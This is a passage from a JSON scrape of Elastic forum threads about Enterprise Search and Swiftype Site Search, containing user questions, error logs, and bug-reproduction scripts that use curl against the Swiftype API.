JarMain.invokeMethod(JarMain.java:263) > connectors.1 | at WarMain.launchJRuby(WarMain.java:263) > connectors.1 | at JarMain.start(JarMain.java:158) > connectors.1 | at WarMain.start(WarMain.java:357) > connectors.1 | at JarMain.doStart(JarMain.java:233) > connectors.1 | at WarMain.main(WarMain.java:367)",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "5b4fc87e-2783-49bb-9382-e84f799e7860",
    "url": "https://discuss.elastic.co/t/about-the-enterprise-search-category/180081",
    "title": "About the Enterprise Search category",
    "category": [
      "Enterprise Search"
    ],
    "author": "warkolm",
    "date": "January 28, 2020, 4:25pm January 29, 2020, 8:43pm",
    "body": "The place for discussion related to the Elastic Enterprise Search solution and the Workplace Search and App Search products. Search through everything in your org and build fast, scalable, and relevant search anywhere you need it.",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "409a381f-3f7f-4a1c-98b4-5230e700acff",
    "url": "https://discuss.elastic.co/t/console-only-available-on-http-localhost-3002/216272",
    "title": "Console only available on http://localhost:3002",
    "category": [
      "Enterprise Search"
    ],
    "author": "Jo_De_Troy",
    "date": "January 23, 2020, 2:47pm January 23, 2020, 3:34pm",
    "body": "Hello, is there a way to expose the console that's default available via http://localhost:3002 to the outside world? I've tried using ent_search.external_url in config/enterprise-search.yml but after startup it still only listen on localhost:3002 Thx, Jo",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "0f2659dc-a742-40cf-b779-5dd11b8bb3a8",
    "url": "https://discuss.elastic.co/t/v7-5-tika-sax-error-property-com-ctc-wstx-maxentitycount-is-not-supported/215212",
    "title": "V7.5 Tika SAX error: Property com.ctc.wstx.maxEntityCount is not supported",
    "category": [
      "Enterprise Search"
    ],
    "author": "sgwillett",
    "date": "January 15, 2020, 9:04pm",
    "body": "I am getting this error. Pops up on the regular. Any ideas on a cause or what is going on? connectors.1 | Jan 15, 2020 3:57:14 PM org.apache.tika.utils.XMLReaderUtils trySetStaxSecurityManager connectors.1 | WARNING: SAX Security Manager could not be setup [log suppressed for 5 minutes] connectors.1 | java.lang.IllegalArgumentException: Property com.ctc.wstx.maxEntityCount is not supported",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "d9616c03-b2d1-414c-815b-0cd8d8bf9c16",
    "url": "https://discuss.elastic.co/t/free-on-premise-option-after-release/210252",
    "title": "Free on premise option after release?",
    "category": [
      "Enterprise Search"
    ],
    "author": "Michael_C",
    "date": "December 2, 2019, 10:00pm December 5, 2019, 8:54am December 6, 2019, 4:10am",
    "body": "Similar to Elastic and APM - will there be a free, downloadable, on-premise option for Enterprise Search? Or what roughly might the feature breakdown by cost be? We currently use Searchblox but it continues to have rough edges. We love Kibana already and think Elastic overall is headed in an excellent direction. Having logs, metrics, apm and search within a unified and consistent system would be a dream.",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "dbcd3cbd-54b2-4d26-a6f9-403e5b4cee30",
    "url": "https://discuss.elastic.co/t/pricing-and-deployment-options/210652",
    "title": "Pricing and deployment options",
    "category": [
      "Enterprise Search"
    ],
    "author": "MichelZ",
    "date": "December 5, 2019, 8:59am",
    "body": "Do we already know what options we'll have to deploy this? Will it be part of the Elastic Cloud offering for free, or as a add-on with additional cost? Will there be a free version? Currently, a Premium license is required, will this be the requirement as well once this is GA? The product looks interesting, but without more details on the pricing/deployment front we're not going to invest the time to even test this",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "7fe0c2dd-454d-42ee-b617-626130442a34",
    "url": "https://discuss.elastic.co/t/what-is-ga-for-enterprise-search/200986",
    "title": "What is GA for Enterprise Search?",
    "category": [
      "Enterprise Search"
    ],
    "author": "Pierre_ALLYNDREE",
    "date": "September 25, 2019, 7:51am September 25, 2019, 3:17pm December 5, 2019, 8:56am",
    "body": "When is GA ? Thanks",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "ec959bb9-15ee-450d-92d3-31cebfdcfc39",
    "url": "https://discuss.elastic.co/t/is-the-confluence-cloud-documentation-correct/208547",
    "title": "Is the Confluence Cloud documentation correct?",
    "category": [
      "Enterprise Search"
    ],
    "author": "jporter",
    "date": "November 19, 2019, 4:49pm",
    "body": "I was following the documentation here Swiftype Confluence Cloud Connector Guide | Swiftype Documentation Learn how to get the most out of Swiftype Everything goes as described until I click 'add' on the section Click **Add** under the Confluence source. First, you'll need to click **I understand** . Why the hurdle? We want to make it clear that you're adding a *public source* . (this is on the page with url http://localhost:3002/ent/org/sources/add#/ ) The response to this is a server error status 500. Following the logs within the terminal hosting enterprise search doesn't yield anything obvious except that there was an error with the get request which can be replicated with - the stacktrace was then followed through but it's hard to say without seeing the code. Happy to look into attaching logs if that would help: curl localhost:3002/ent/org/sources/confluence_cloud/new -u enterprise_search Important to note that I have tried the custom API and dropbox and these added fine. Any help appreciated, even if just a confirmation that this works/doesn't work for someone else Thanks in advance",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "bc4767cb-1225-4b12-a10a-9b225cc19f9a",
    "url": "https://discuss.elastic.co/t/beta-3-search-inside-pptx-and-images/207133",
    "title": "Beta 3 Search Inside .PPTX and Images",
    "category": [
      "Enterprise Search"
    ],
    "author": "sgwillett",
    "date": "November 8, 2019, 3:06pm",
    "body": "Beta 3 is up and running well. It is indexing inside of everything I expect except .ppt or .pptx and images. Images I understand as that requires OCR. Are the .ppt and .pptx known or am I missing a switch? OSX Mojave. Using ES 7.4 with platinum license. Thanks! -Steve",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "91360579-011d-4cf6-8caa-8188ae745039",
    "url": "https://discuss.elastic.co/t/any-solution/204984",
    "title": "Any solution?",
    "category": [
      "Enterprise Search"
    ],
    "author": "pbona",
    "date": "October 24, 2019, 1:59am October 24, 2019, 2:58am October 24, 2019, 2:58am",
    "body": "[root@elastic ~]# auditbeat setup --dashboards Loading dashboards (Kibana must be running and reachable) Exiting: Failed to import dashboard: Failed to load directory /usr/share/auditbeat/kibana/7/dashboard: error loading /usr/share/auditbeat/kibana/7/dashboard/auditbeat-file-integrity.json: index [.kibana_2] blocked by: [FORBIDDEN/12/index read-only / allow delete (api)];. Response: {\"objects\":[{\"id\":\"AV0tVcg6g1PYniApZa-v-ecs\",\"type\":\"visualization\",\"error\":{\"message\":\"index [.kibana_2] blocked by: [FORBIDDEN/12/index read-only / allow delete (api)];\"}},{\"id\":\"AV0tV05vg1PYniApZbA2-ecs\",\"type\":\"visualization\",\"error\":{\"message\":\"... (truncated) strong text",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "2b26429e-bf0e-4237-b1b9-e85737547666",
    "url": "https://discuss.elastic.co/t/announcement-elastic-enterprise-search-beta-3-released/204088",
    "title": "[ANNOUNCEMENT] Elastic Enterprise Search Beta 3 Released",
    "category": [
      "Enterprise Search"
    ],
    "author": "goodroot",
    "date": "October 17, 2019, 3:22pm October 17, 2019, 3:22pm",
    "body": "It's live! Read more about it. Download it.",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "586c9889-9e76-4512-be7f-cd1cf0ae8580",
    "url": "https://discuss.elastic.co/t/search-within-the-body-of-documents/183764",
    "title": "Search Within the Body of documents",
    "category": [
      "Enterprise Search"
    ],
    "author": "sgwillett",
    "date": "May 31, 2019, 4:26pm May 31, 2019, 4:29pm May 31, 2019, 4:45pm September 9, 2019, 4:09am September 9, 2019, 4:43pm September 11, 2019, 10:10am September 24, 2019, 5:24pm September 25, 2019, 7:49am September 25, 2019, 2:49pm September 25, 2019, 3:02pm",
    "body": "This version doesn't seem to be able to access the content of the body. Is the connector to dropbox or a configuration within elasticsearch necessary?",
    "website_area": "discuss",
    "replies": 10
  },
  {
    "id": "c0524d7f-dfde-4d3e-90fc-c3f1799fe006",
    "url": "https://discuss.elastic.co/t/not-able-to-search-documents-in-custom-content-source-in-enterprise-search-beta-2/200828",
    "title": "Not able to search documents in custom Content Source in Enterprise Search Beta 2",
    "category": [
      "Enterprise Search"
    ],
    "author": "SriAkash",
    "date": "September 24, 2019, 9:18am",
    "body": "I' able to search documents that have been indexed via connectors like Jira and Confluence. But unable to search documents indexed via Custom API. Pasting the content of enterprise-search.log : [action_controller][INFO]: [9ba5fa63-3745-43e1-9d57-9e02fe1e3f85] Parameters: {\"q\"=>\"Sample doc\", \"host\"=>\"xx.xxx.xxx.xx\", \"protocol\"=>\"http\"} [action_controller][INFO]: [9ba5fa63-3745-43e1-9d57-9e02fe1e3f85] Completed 200 OK in 318ms (Views: 0.3ms) [rails][ERROR]: [da767131-c4da-4ec4-8421-690a13696499] None of 0 processors could process the event: {\"info\":{\"datacenter\":\"local\",\"node_name\":\"xx.xxx.xxx.xx\",\"event_id\":\"5d89d1b5dcc84dcdabf2b6b1\",\"timestamp\":\"2019-09-24T08:20:05Z\",\"client_platform\":\"browser\",\"content_source_ids\":[\"5d7b3816dcc84df5454a808d\",\"5d7b9c11dcc84daa0e4a809e\",\"5d7ba453dcc84db96c4a80c0\",\"5d888922dcc84dcaa8f2b683\",\"5d88adb3dcc84d0083f2b69b\"],\"federated\":false,\"grouped\":true,\"organization_id\":\"5d728965dcc84d0793f2ed8f\",\"query\":\"Sample doc\",\"sort_field\":{\"all\":\"_score\"},\"total_result_count\":0},\"type\":\"frito_pie_organization_query\"} [action_controller][INFO]: [da767131-c4da-4ec4-8421-690a13696499] Completed 200 OK in 931ms (Views: 0.4ms)",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "d44c2864-459b-4959-bef1-3595bc2004c7",
    "url": "https://discuss.elastic.co/t/enterprise-search-connect-and-search-my-index-in-elasticsearch/200106",
    "title": "Enterprise Search connect and search my index in elasticsearch",
    "category": [
      "Enterprise Search"
    ],
    "author": "111207",
    "date": "September 19, 2019, 3:53am September 19, 2019, 3:24pm",
    "body": "I have old Index And I want to connect with Enterprise search.Please suggest how to connect to me. Or is there another way to suggest me",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "90c59a4a-ef3d-4e3a-9607-3209b71018a5",
    "url": "https://discuss.elastic.co/t/cannot-get-enterprise-search-beta1-to-work/180584",
    "title": "Cannot Get Enterprise Search Beta1 to work",
    "category": [
      "Enterprise Search"
    ],
    "author": "christopher.farmer",
    "date": "May 10, 2019, 3:27pm May 10, 2019, 4:04pm May 10, 2019, 3:58pm May 10, 2019, 3:59pm May 10, 2019, 4:01pm May 10, 2019, 4:15pm May 10, 2019, 5:54pm May 10, 2019, 6:30pm May 10, 2019, 7:01pm May 10, 2019, 8:12pm May 10, 2019, 10:25pm May 11, 2019, 1:25am May 11, 2019, 3:05am May 13, 2019, 2:08pm May 13, 2019, 7:21pm May 14, 2019, 8:03am May 14, 2019, 12:55pm May 17, 2019, 3:33pm June 12, 2019, 6:39pm August 8, 2019, 8:07pm",
    "body": "I have a clean build of Fedora/ELK running with Oracle 8 JDK, but cannot get EES to work - getting the following; Found java executable in PATH Java version: 1.8.0_211 Starting the following Elastic Enterprise Search stack components: An application server A pool of background workers A pool of connectors A filebeat instance for indexing logs forego | starting app-server.1 on port 5000 forego | starting background-worker.1 on port 5100 forego | starting filebeat.1 on port 5300 forego | starting connectors.1 on port 5600 background-worker.1 | ERROR: org.jruby.exceptions.SystemExit: (SystemExit) exit app-server.1 | app-server.1 | -------------------------------------------------------------------------------- app-server.1 | app-server.1 | Invalid config file (/usr/downloads/enterprisesearch-0.1.0-beta1/config/enterprise_search.yml): app-server.1 | The setting '#/' contains additional properties [\"listen_host\", \"listen_port\"] outside of the schema when none are allowed app-server.1 | app-server.1 | -------------------------------------------------------------------------------- app-server.1 | app-server.1 | ERROR: org.jruby.exceptions.SystemExit: (SystemExit) exit forego | sending SIGTERM to app-server.1 forego | sending SIGTERM to connectors.1 forego | sending SIGTERM to filebeat.1 connectors.1 | ERROR: org.jruby.exceptions.LoadError: (LoadError) load error: /tmp/jruby7238240652883867351extract/frito_togo/lib/frito_togo -- java.lang.NoClassDefFoundError: jnr/constants/platform/linux/Errno$StringTable filebeat.1 | ERROR: org.jruby.exceptions.LoadError: (LoadError) load error: /tmp/jruby9169685294815892085extract/config/application -- java.lang.NoClassDefFoundError: org/jruby/RubyEnumerable$57 Two things; I set the listen address and port... I also have not yet set up security in the ELK Trial. (I will set up security just to rule it out) Help! (Thanks!)",
    "website_area": "discuss",
    "replies": 21
  },
  {
    "id": "dc25eaea-9803-4555-bd28-f45d88cd645e",
    "url": "https://discuss.elastic.co/t/linux-osx-zip-missing-simlinks/180411",
    "title": "Linux / OSX zip missing simlinks",
    "category": [
      "Enterprise Search"
    ],
    "author": "sgwillett",
    "date": "May 9, 2019, 4:47pm May 9, 2019, 8:11pm",
    "body": "When running enterprise search the config doesn't seen right BIN_DIR=$(dirname \"$0\") BIN_DIR=$(realpath \"$BIN_DIR\") export APP_ROOT=\"(cd \"(dirname \"$BIN_DIR\")\"; pwd)\" CONFIG_DIR=\"$APP_ROOT/config\" LIB_DIR=\"$APP_ROOT/lib\" This config causes the system to look in the bin directory for lib and filebeat I had to create simlinks or copy the lib and filebeat directories to bin. I don't believe this is the desired state.",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "8877dac6-6e4d-4ba2-96a7-85489681791f",
    "url": "https://discuss.elastic.co/t/preview-images-for-indexed-documents/180404",
    "title": "Preview Images for indexed documents",
    "category": [
      "Enterprise Search"
    ],
    "author": "sgwillett",
    "date": "May 9, 2019, 4:05pm May 9, 2019, 4:31pm",
    "body": "I see the previews on your documentation and screen grabs. But I don't see any previews in my installation. Am I missing something in the configuration?",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "3d8e8d94-3427-48d3-b322-07f071a479be",
    "url": "https://discuss.elastic.co/t/about-the-site-search-category/159241",
    "title": "About the Site Search category",
    "category": [
      "Site Search"
    ],
    "author": "warkolm",
    "date": "December 3, 2018, 11:12pm",
    "body": "Site Search (powered by Swiftype) provides all the tools you need to build a powerful search experience for your website, without the learning curve. All that, at scale, backed by Elasticsearch.",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "ed2c289a-52b3-4fab-90b1-0f3b59606ff7",
    "url": "https://discuss.elastic.co/t/swiftype-document-expiration-api-does-not-seem-to-work/224322",
    "title": "Swiftype Document Expiration API does not seem to work",
    "category": [
      "Site Search"
    ],
    "author": "bhsiaoNFLX",
    "date": "March 20, 2020, 9:59pm",
    "body": "I believe I may have found an issue with Swiftype's Document Expiration API: https://swiftype.com/documentation/site-search/indexing#expiration. I followed what the API docs said to do in regards to expires_after and precise_expiration, but no matter what I try I always seem to get back a record that should have already expired. See below for a minimal bash script that reproduces the issue (API KEY omitted intentionally). It creates a dummy document MY_DOC for MY_ENGINE_KEY with a randomized string and expires_after 60 seconds in the future, waits for 70 seconds, then runs a search query, with precise_expiration set, against the same randomized string. The expectation is that the record should have expired already, therefore no record should get return, however, I always seem to get 1 back. The following test script reproduces the bug: #! /bin/bash export LC_CTYPE=C export random_search_string=$(cat /dev/random | tr -dc \"[:alpha:]\" | head -c 32) export ONE_MINUTE_LATER=$(date -v+1M +%s) export MY_DOC=\"\" export MY_ENGINE_KEY=\"\" export MY_API_KEY=\"\" printf \"Search string: $random_search_string\\n\" printf \"Creating '\"$MY_DOC\"' record with expire_after 60 seconds in the future\\n\" curl -X POST 'https://api.swiftype.com/api/v1/engines/'\"$MY_ENGINE_KEY\"'/document_types/'\"$MY_DOC\"'/documents/async_bulk_create_or_update' \\ -H 'Content-Type: application/json' \\ -d '{ \"auth_token\": \"'\"$MY_API_KEY\"'\", \"documents\": [ { \"expires_after\": '\"$ONE_MINUTE_LATER\"', \"external_id\": \"33333\", \"fields\": [ { \"name\": \"external_id\", \"value\": 33333, \"type\": \"string\" }, { \"name\": \"text\", \"value\": \"Dummy_title\", \"type\": \"string\" }, { \"name\": \"slug\", \"value\": \"dummy-slug\", \"type\": \"string\" }, { \"name\": \"lever_id\", \"value\": \"dummy_lever_id\", \"type\": \"string\" }, { \"name\": \"location\", \"value\": \"Los Gatos, California\", \"type\": \"string\" }, { \"name\": \"state\", \"value\": \"published\", \"type\": \"string\" }, { \"name\": \"url\", \"value\": \"https://jobs.netflix.com/jobs/33333\", \"type\": \"enum\" }, { \"name\": \"created_at\", \"value\": \"Wed Sep 05 2018 23:43:56 GMT+0000 (Coordinated Universal Time)\", \"type\": \"date\" }, { \"name\": \"description\", \"value\": \"dummy description\", \"type\": \"text\" }, { \"name\": \"lever_team\", \"value\": \"dummy lever team\", \"type\": \"string\" }, { \"name\": \"search_text\", \"value\": \"'\"$random_search_string\"'\", \"type\": \"text\" }, { \"name\": \"subteam\", \"value\": \"dummy subteam\", \"type\": \"string\" }, { \"name\": \"organization\", \"value\": \"dummy org\", \"type\": \"string\" }, { \"name\": \"team\", \"value\": \"dummy team\", \"type\": \"string\" } ] } ] }' printf \"\\nWait 70 seconds...\" sleep 70s printf \"\\nCalling search with precise_expiration flag\" # Actual record_count:1, Expected: record_count:0 curl -XGET 'https://search-api.swiftype.com/api/v1/engines/'\"$MY_ENGINE_KEY\"'/document_types/'\"$MY_DOC\"'/search.json' \\ -H 'Content-Type: application/json' \\ -d '{ \"auth_token\": \"'\"$MY_API_KEY\"'\", \"q\": \"'\"$random_search_string\"'\", \"precise_expiration\": { \"'$MY_DOC'\": true } }' Here's a sample output I get when I run the script on my macbook: Search string: GoeUwAJkYlKATKPrrPfJntygnyKCUkoy Creating 'postings' record with expire_after 60 seconds in the future {\"batch_link\":\"https://api.swiftype.com/api/v1/document_receipts.json?ids=5e753ac882ecd375041dc72f\",\"document_receipts\":[{\"id\":\"5e753ac882ecd375041dc72f\",\"external_id\":\"33333\",\"status\":\"pending\",\"errors\":[],\"links\":{\"document_receipt\":\"https://api.swiftype.com/api/v1/document_receipts/5e753ac882ecd375041dc72f.json\",\"document\":null}}]} Wait 70 seconds... Calling search with precise_expiration flag{\"record_count\":1,\"records\":{\"postings\":[{\"text\":\"Dummy_title\",\"lever_id\":\"dummy_lever_id\",\"team\":\"dummy team\",\"slug\":\"dummy-slug\",\"external_id\":\"33333\",\"description\":\"dummy description\",\"url\":\"https://jobs.netflix.com/jobs/33333\",\"search_text\":\"GoeUwAJkYlKATKPrrPfJntygnyKCUkoy\",\"state\":\"published\",\"updated_at\":\"2020-03-20T21:51:04+00:00\",\"created_at\":\"2018-09-05T23:43:56Z\",\"location\":\"Los Gatos, California\",\"organization\":\"dummy org\",\"subteam\":\"dummy subteam\",\"lever_team\":\"dummy lever team\",\"_index\":\"5e1367e6c35bc9473d5fe272\",\"_type\":\"5e74278682ecd314521dab28\",\"_score\":11.990819,\"_version\":null,\"_explanation\":null,\"sort\":null,\"id\":\"5e74278d28ccbc113e741f21\",\"highlight\":{}}]},\"info\":{\"postings\":{\"query\":\"GoeUwAJkYlKATKPrrPfJntygnyKCUkoy\",\"current_page\":1,\"num_pages\":1,\"per_page\":20,\"total_result_count\":1,\"facets\":{}}},\"errors\":{}} The important part of this output is that record_count is 1 and not 0 .",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "39da39db-cb5f-4da0-9af5-4eb586ed3130",
    "url": "https://discuss.elastic.co/t/jquery-api-cant-fetch-existing-facets/227426",
    "title": "Jquery API can't fetch existing facets",
    "category": [
      "Site Search"
    ],
    "author": "Prabhu_Sunkara",
    "date": "April 10, 2020, 1:06am",
    "body": "Jquery API can't fetch existing facets.",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "31bb8c6e-c378-4589-8f91-36dc86162d7d",
    "url": "https://discuss.elastic.co/t/using-jquery-api-cant-search-all-results-i-e-empty-stq/227425",
    "title": "Using Jquery APi Can't search all results. i.e empty #STQ=",
    "category": [
      "Site Search"
    ],
    "author": "Prabhu_Sunkara",
    "date": "April 10, 2020, 1:03am",
    "body": "Using Jquery APi Can't search all results. i.e empty #STQ=",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "37d2e5d6-8d7a-4236-94d2-82271fe752b1",
    "url": "https://discuss.elastic.co/t/are-pro-features-available-in-trial/225104",
    "title": "Are PRO Features available in Trial?",
    "category": [
      "Site Search"
    ],
    "author": "doncesar",
    "date": "March 26, 2020, 3:21am March 28, 2020, 10:11pm",
    "body": "Hi there Can you tell me if pro features like crawling multiple domains and indexing PDF files are available on SiteSearch trial? Cust Rep says those are, but Dashboard doesn't show the Domains tab. Please advise... Regards",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "7d1c0e95-119d-4039-863b-b856ec91b46c",
    "url": "https://discuss.elastic.co/t/analytics-api-for-autocompletes/224919",
    "title": "Analytics API for AutoCompletes",
    "category": [
      "Site Search"
    ],
    "author": "elasticprashar",
    "date": "March 24, 2020, 9:28pm April 21, 2020, 9:28pm",
    "body": "Hey guys, In my dashboard, I'm able to see both searches and autocompletes per engine that I have. I can query the searches using the analytics endpoint provided, as per the documentation here. I'm wondering why there isn't something similar for autocompletes ? I see autoselects, but not autocomplete ... Is there something available ? -Thanks !",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "48c2f81c-9f57-4889-974f-e510a7f756ac",
    "url": "https://discuss.elastic.co/t/unable-to-view-simple-results-with-search-ui/223361",
    "title": "Unable to view simple results with search ui",
    "category": [
      "Site Search"
    ],
    "author": "elitzur_e",
    "date": "March 12, 2020, 2:57pm March 12, 2020, 3:11pm April 9, 2020, 3:11pm",
    "body": "Hi. i am trying to use search ui with site search. after setting things up it seems that i can search but not VIEW anything. in the network tab it seems that responses are being retunred but they are not rendered. i followed the getting started on github. my code: import React from \"react\"; import { SearchProvider, Results, SearchBox } from \"@elastic/react-search-ui\"; import { Layout } from \"@elastic/react-search-ui-views\"; import SiteSearchAPIConnector from \"@elastic/search-ui-site-search-connector\"; import \"@elastic/react-search-ui-views/lib/styles/styles.css\"; const connector = new SiteSearchAPIConnector({ documentType: \"my-site\", engineKey: \"*********\" }); export default function App() { return ( <SearchProvider config={{ apiConnector: connector }} > <div className=\"App\"> <Layout header={<SearchBox />} bodyContent={<Results titleField=\"title\" urlField=\"nps_link\" />} /> </div> </SearchProvider> ); }",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "ca6f6b39-6c46-42df-9b79-75e43d8647df",
    "url": "https://discuss.elastic.co/t/can-you-search-for-swagger-files/221322",
    "title": "Can you search for swagger files",
    "category": [
      "Site Search"
    ],
    "author": "bhavyarm",
    "date": "February 27, 2020, 8:14pm February 27, 2020, 10:33pm March 2, 2020, 8:46pm March 30, 2020, 8:47pm",
    "body": "Hey team, At confoo MTL here. An attendee has this question on sitesearch. We want to ingest swagger and markdown files in our developer portal and use elastic to enable searching. Is that possible? smacdona@adobe.com Thanks, Bhavya",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "4ab3d39b-73df-4c76-bac0-0d1906104c4e",
    "url": "https://discuss.elastic.co/t/change-order-to-return-web-pages-first/216090",
    "title": "Change order to return web pages first",
    "category": [
      "Site Search"
    ],
    "author": "elitzur_e",
    "date": "January 22, 2020, 3:58pm February 13, 2020, 10:53am February 14, 2020, 11:21am February 17, 2020, 12:51pm March 16, 2020, 12:45pm",
    "body": "HI, is there a way to change the weight (or some other method) so that all web pages typs get a higher score? thanks",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "9fa4f2eb-2190-4e91-9a76-93fb68b62223",
    "url": "https://discuss.elastic.co/t/search-relevance/219521",
    "title": "Search Relevance",
    "category": [
      "Site Search"
    ],
    "author": "stevetso",
    "date": "February 16, 2020, 2:17pm March 15, 2020, 2:17pm",
    "body": "I am now evaluating the app search and ingested some data into the Swiftype engine for my evaluation. There is a feature called search relevance which could let Swiftype return some relevant results based on its model. We found some results that we think totally irrelevant, which we cannot found any keywords match, or synonym match or result tuning. Such items are included because they have the score 0.1. Can you know why such item got 0.1 score and that why included in the search result. Thanks.",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "3e379ae6-ee7f-4c0b-b709-d6c497367d69",
    "url": "https://discuss.elastic.co/t/search-weighting-url/219304",
    "title": "Search Weighting (URL)",
    "category": [
      "Site Search"
    ],
    "author": "stevetso",
    "date": "February 14, 2020, 4:18am February 14, 2020, 11:52am February 14, 2020, 3:34pm February 14, 2020, 7:36pm March 13, 2020, 7:36pm",
    "body": "Our URLs contains the keywords and would like to adjust the weighting. For example: https://www.nowe.com/movie/Parasite-92111 This content is indexed into the site search but unable to search with keyword \"parasite\". I tried to adjust the weighting of \"url\" to \"4\" but still unable to search this content with keyword \"parasite\". Is it possible to be supported by Site Search?",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "d1ed0cea-75e0-47fb-89f7-971e7f098a8f",
    "url": "https://discuss.elastic.co/t/sort-on-multiple-fields-with-site-search-api/217831",
    "title": "Sort on multiple fields with Site search API",
    "category": [
      "Site Search"
    ],
    "author": "JeromeKaliop",
    "date": "February 4, 2020, 2:28pm February 14, 2020, 11:26am March 13, 2020, 11:25am",
    "body": "Hi, We are using the Swiftype Site search API and we would like to sort documents on multiple fields (of the same document type). The documentation page (https://swiftype.com/documentation/site-search/searching/sorting) suggests that we can only sort on 1 field per document type. I'm suprised of this limitation and I would like to know if there is another way to do that with the Site search API ? Thanks for your help",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "515a8411-1608-4450-a32c-c6c330e9f67c",
    "url": "https://discuss.elastic.co/t/document-size-limitations-in-sitesearch/219073",
    "title": "Document size limitations in Sitesearch",
    "category": [
      "Site Search"
    ],
    "author": "documentsize",
    "date": "February 12, 2020, 7:35pm March 11, 2020, 7:35pm",
    "body": "Starting investigation to determine if sitesearch will work in our environment. We have approx. 6000 pdf documents that vary in size. Looking at the document limitations in the API limitations, it indicates that the document size limitation is 100kb. Swiftype Plan & API Limitations | Swiftype Documentation Learn how to get the most out of Swiftype Has anyone found an easy way around this?",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "10901fcc-a810-4479-8022-a1988d1bb9ca",
    "url": "https://discuss.elastic.co/t/fallback-in-highlight-fields-not-working-as-documented/218669",
    "title": "Fallback in highlight_fields not working as documented",
    "category": [
      "Site Search"
    ],
    "author": "Ben_Walding",
    "date": "February 10, 2020, 9:02pm February 11, 2020, 1:10pm March 10, 2020, 1:10pm",
    "body": "(basically the same issue as reported here - Highlight fields not matching multiple words) When querying using highlight_fields, for a non-exact match, I would expect that setting fallback=true would cause the search response to include raw data in the highlight field. (as per docs - https://swiftype.com/documentation/site-search/searching/highlight-fields) What we actually see is that the highlight field in the response is empty. The demo shown at https://search-ui-stable-site-search.netlify.com/?q=100-mile&size=n_20_n is \"cheating\" - when it receives nothing in the highlight field, it substitutes the body of the search response document. In the image below we searched for \"100 mile\" (unquoted) and the highlighter worked properly. image1648×1174 166 KB When we search for \"100-mile\" (unquoted), the search response does not contain highlight data - and the body content is substituted by the front-end. Request fragment: curl 'https://search-api.swiftype.com/api/v1/public/engines/search.json' \\ -H 'Accept: */*' \\ -H 'Content-Type: application/json' \\ --data '{\"engine_key\":\"Z43R5U3HiDsDgpKawZkA\",\"per_page\":20,\"page\":1,\"facets\":{\"national-parks\":[\"world_heritage_site\",\"states\"]},\"fetch_fields\":{\"national-parks\":[\"visitors\",\"world_heritage_site\",\"location\",\"acres\",\"square_km\",\"title\",\"nps_link\",\"states\",\"date_established\",\"description\"]},\"highlight_fields\":{\"national-parks\":{\"title\":{\"size\":100,\"fallback\":true},\"description\":{\"size\":100,\"fallback\":true}}},\"q\":\"100-mile\"}' Response fragment: image1644×1182 197 KB",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "dd46ea6f-9452-4911-b37f-68e96cb5ca35",
    "url": "https://discuss.elastic.co/t/crawler-results-report/217858",
    "title": "Crawler results report?",
    "category": [
      "Site Search"
    ],
    "author": "elepine",
    "date": "February 4, 2020, 5:46pm March 3, 2020, 5:43pm",
    "body": "Is it possible to view a list of the pages the crawler has found on my site? I can see that it's found 645 pages on one of my domains, but I know there should be 1000+, so I want to figure out what it's NOT finding so I can suss out WHY it's not finding that content. TIA for any advice! ETA the domain I'm working on is http://docs.eggplantsoftware.com/",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "fa28cf0c-88bb-4261-a1c2-ac5ec477d6e7",
    "url": "https://discuss.elastic.co/t/implementing-elastic-site-search-in-place-of-searchblox/213994",
    "title": "Implementing Elastic Site search in place of SearchBlox",
    "category": [
      "Site Search"
    ],
    "author": "Yogesh_Chandra",
    "date": "January 7, 2020, 7:20am January 7, 2020, 6:33pm February 4, 2020, 6:33pm",
    "body": "Hi, We are currently using searchblox to crawl our website and Alfresco (CMS), this also crawls the metadata of documents and presents the results. Now we are planning to move to elastic site search and wanted to understand if same crawling is feasible with vanilla elastic search.",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "6e18ccf9-1ad4-4f3d-b107-f8ea0bf052a3",
    "url": "https://discuss.elastic.co/t/crawler-ip-address-or-block/213756",
    "title": "Crawler IP Address or Block",
    "category": [
      "Site Search"
    ],
    "author": "Ronno",
    "date": "January 3, 2020, 10:41pm January 31, 2020, 10:41pm",
    "body": "Hi, my site is still in development and public traffic is blocked by default. What is your crawler's IP block so I can whitelist you?",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "b4c7aaff-56fa-47b1-9f19-5b33225b7e46",
    "url": "https://discuss.elastic.co/t/site-search-engine-not-supporting-autocompletesuggestions/211483",
    "title": "Site Search Engine not supporting autocompleteSuggestions",
    "category": [
      "Site Search"
    ],
    "author": "sarrame",
    "date": "December 11, 2019, 11:07pm December 19, 2019, 6:11pm December 19, 2019, 6:25pm January 16, 2020, 6:25pm",
